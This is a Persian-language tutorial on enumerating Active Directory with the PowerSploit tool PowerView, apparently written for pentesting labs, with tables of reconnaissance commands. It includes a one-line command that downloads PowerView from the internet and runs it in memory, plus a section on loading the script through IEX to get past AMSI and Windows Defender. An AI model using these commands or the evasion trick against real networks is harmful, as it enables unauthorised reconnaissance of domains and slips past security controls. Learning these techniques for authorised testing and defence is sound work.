


---

# 🧠 Active Directory Enumeration with PowerView

---

## 🛠️ PowerView چیست؟

**PowerView** یکی از ابزارهای PowerShell محور هست که توسط تیم PowerSploit ساخته شده. این ابزار به Pentesterها، Red Teamها و مهاجمان کمک می‌کنه تا ساختار AD رو بشناسن، کاربران و گروه‌ها رو شناسایی کنن، مسیرهای privilege escalation رو کشف کنن و آسیب‌پذیری‌های مبتنی بر تنظیمات غلط رو بررسی کنن.

---

## 🎯 اهداف PowerView

با PowerView می‌تونی:

|هدف|توضیح|
|---|---|
|شناسایی دامنه و Forest|کشف نام دامنه‌ها، دامین کنترلرها، Trustها و غیره|
|کشف کاربران، گروه‌ها و OUها|بررسی اینکه چه کاربرهایی کجا هستن و عضو چه گروه‌هایی هستن|
|بررسی سشن‌ها و سیستم‌ها|چه کسی روی کجا لاگین کرده؟ چه سیستمی Admin باز داره؟|
|کشف ACL و کنترل‌ها|چه کسی روی چه Objectی کنترل داره؟ (کلید privilege escalation)|
|بررسی Trustها|روابط Trust بین دامین‌ها|

---

## 🧰 نصب PowerView

می‌تونی PowerView.ps1 رو از GitHub دانلود کنی و لودش کنی:

```powershell
Import-Module .\PowerView.ps1
```

یا برای دانلود مستقیم از اینترنت:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

## نکته : در بعضی موارد اگر بخواهیم این ماژول رو ایمپورت کنیم توسط  AMSI شناسایی میشه و توسط windows defender جلوگیری میشه اینجاس که باید بیایم و به مستقیم در حافظه لودش کنیم 

```
iex(Get-Content .\PowerView.ps1 -Raw)
```

با استفاده از این دستور مستقیم داخل حافظه لودش میکنیم 

### 🔎 تفاوت Import-Module و IEX

1. **Import-Module**
    
    - وقتی اجرا می‌کنی، PowerShell میاد فایل رو بررسی می‌کنه:
        
        - Syntax check
            
        - Metadata (مثل Export-ModuleMember)
            
        - و از همه مهم‌تر → فایل رو **به AMSI و AV می‌فرسته** برای اسکن.
            
    - چون PowerView.ps1 توی Signatureهای AV/AMSI هست → فوراً بلاک میشه.
        
2. **IEX (Get-Content -Raw)**
    
    - اینجا داری محتوای فایل رو **به شکل یک رشته ساده** می‌گیری.
        
    - بعد با `IEX` (Invoke-Expression) اجراش می‌کنی.
        
    - AMSI همچنان درگیر میشه (چون PowerShell هر چیزی که اجرا میشه رو به AMSI میده)، ولی این بار دیگه مرحله‌ی "Import-Module pre-scan" وجود نداره.
        
    - در نتیجه بعضی اسکریپت‌ها که با Import-Module مستقیم بلاک میشن، با IEX ممکنه رد بشن (مخصوصاً اگه Signature دقیقاً روی فرمت Module تعریف شده باشه).
        

---

### 🔎 پس مشکل نداره یا داره؟

- **از نظر فنی**: هر دو روش، کد PowerView رو وارد Session می‌کنن (فانکشن‌ها لود میشن و می‌تونی صداشون بزنی).
    
- **از نظر امنیتی**: IEX خطرناک‌تره چون هر چیزی توی فایل باشه بدون بررسی اجرا میشه. به همین خاطره که توی دفاع همیشه میگن IEX رو بلاک کن.
    
- **از نظر AMSI/AV**: IEX ممکنه بعضی Signatureها رو دور بزنه، ولی همچنان کدی که شامل کلیدواژه‌های حساس (مثل `Invoke-Mimikatz`) باشه رو AMSI شناسایی می‌کنه.
    

---

✅ نتیجه برای تو (توی لاب):

- Import-Module = مستقیم بلاک میشه.
    
- IEX = شانست بیشتره که اسکریپت لود بشه.
    
- هر دو روش در نهایت به AMSI میرسن، فقط نقطه‌ی ورود متفاوته.

---

## 🧾 بخش‌های مهم PowerView

بیا با هم دسته‌بندی کنیم:

---

### ✅ 1. اطلاعات مربوط به دامنه و کنترلرها

| دستور                     | توضیح                          |
| ------------------------- | ------------------------------ |
| `Get-NetDomain`           | اطلاعات دامنه فعلی             |
| `Get-NetForest`           | اطلاعات جنگل (forest)          |
| `Get-NetDomainController` | لیست دامین کنترلرها            |
| `Get-NetForestDomain`     | لیست دامین‌های موجود در Forest |
| `Get-DomainPolicy`        | مشاهده Group Policy اصلی دامنه |

---

### ✅ 2. کاربران و گروه‌ها

|دستور|توضیح|
|---|---|
|`Get-NetUser`|لیست کاربران|
|`Get-NetUser -UserName "martin"`|اطلاعات کامل یک کاربر خاص|
|`Get-UserProperty -Properties pwdlastset`|دیدن زمان آخرین تغییر رمز همه کاربران|
|`Get-NetGroup`|همه‌ی گروه‌های دامنه|
|`Get-NetGroupMember -GroupName "Domain Admins"`|اعضای یک گروه خاص|

---

### ✅ 3. کامپیوترها و ساختار AD

|دستور|توضیح|
|---|---|
|`Get-NetComputer`|همه‌ی کامپیوترهای عضو دامنه|
|`Get-NetOU`|لیست واحدهای سازمانی (OUها)|
|`Get-NetSite`|لیست Siteهای Active Directory|
|`Get-NetSubnet`|لیست Subnetهای موجود|

---

### ✅ 4. نشست‌ها و دسترسی‌ها

|دستور|توضیح|
|---|---|
|`Get-NetSession`|چه کسانی روی کدام سیستم‌ها سشن دارن|
|`Get-NetLoggedon`|کاربران لاگین کرده روی یک ماشین خاص|
|`Find-LocalAdminAccess`|چه کامپیوترهایی دسترسی Admin بهت می‌دن|
|`Invoke-CheckLocalAdminAccess`|آیا روی این سیستم لوکال ادمینی؟|

---

### ✅ 5. بررسی ACL و مجوزها

| دستور                                                    | توضیح                                     |
| -------------------------------------------------------- | ----------------------------------------- |
| `Get-ObjectAcl -SamAccountName targetuser -ResolveGUIDs` | چه کسانی روی کاربر خاصی کنترل دارن        |
| `Find-InterestingDomainAcl`                              | مجوزهای خطرناک روی Objectهای دامنه        |
| `Find-InterestingFileAcl`                                | مجوزهای خطرناک روی فایل‌ها و مسیرها (SMB) |

---

### ✅ 6. Trust بین دامنه‌ها

|دستور|توضیح|
|---|---|
|`Get-NetDomainTrust`|روابط Trust بین دامنه‌ها|
|`Get-ForestTrust`|Trust بین Forestها|

---

### ✅ 7. بررسی‌های پیشرفته

| دستور                      | کاربرد                                 |
| -------------------------- | -------------------------------------- |
| `Invoke-UserHunter`        | کشف اینکه کاربران ادمین کجا لاگین کردن |
| `Invoke-StealthUserHunter` | مثل بالا ولی مخفی‌تر                   |
| `Invoke-ShareFinder`       | پیدا کردن فایل شیرهای باز در شبکه      |
| `Invoke-ACLScanner`        | بررسی دسترسی‌های خطرناک روی کل دامنه   |

---

## 🎓 مثال عملی: کشف کاربران و دسترسی‌ها

### لیست همه کاربران:

```powershell
Get-NetUser | Select-Object samaccountname
```

### کشف پسوردهای قدیمی:

```powershell
Get-UserProperty -Properties pwdlastset | Sort-Object pwdlastset
```

### کشف سیستم‌هایی که لوکال ادمینی:

```powershell
Find-LocalAdminAccess
```

---

## 🧠 استفاده ترکیبی با BloodHound

PowerView می‌تونه همراه با BloodHound استفاده بشه برای کشف ACLها، Trustها، سشن‌ها و غیره که داده‌ها رو می‌تونه به گراف تبدیل کنه.

---

## 🔚 جمع‌بندی

**PowerView = چشم تو در Active Directory**

✅ بدون نیاز به اکسپلویت  
✅ فقط با دسترسی کاربر دامنه  
✅ بدون نیاز به نرم‌افزار اضافی  
✅ کشف سریع misconfiguration‌ها

---
